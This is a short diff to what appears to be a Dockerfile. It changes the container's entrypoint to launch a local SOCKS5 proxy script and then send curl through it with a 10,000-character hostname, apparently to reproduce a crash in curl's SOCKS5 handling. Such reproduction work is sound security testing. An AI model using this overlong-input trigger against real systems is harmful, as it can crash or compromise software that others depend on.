@@ -23,8 +23,11 @@ RUN make install
 
 COPY mysocks.py /build/
 
-ENTRYPOINT [ "/bin/sh" , "-c", "python3 /build/mysocks.py" ]
+ENTRYPOINT [ "/bin/sh" , "-c", "python3 /build/mysocks.py & sleep 2 && curl -vvv -x socks5h://localhost:1080 $(python3 -c \"print(('A'*10000), end='')\")"]
 
+# ENTRYPOINT [ "/bin/sh", "-c", "python3 /build/mysocks.py" ]
+
+# ENTRYPOINT [ "/bin/sh" ]
 
 # curl -vvv -x socks5h://localhost:1080 $(python3 -c "print(('A'*10000), end='')")
 
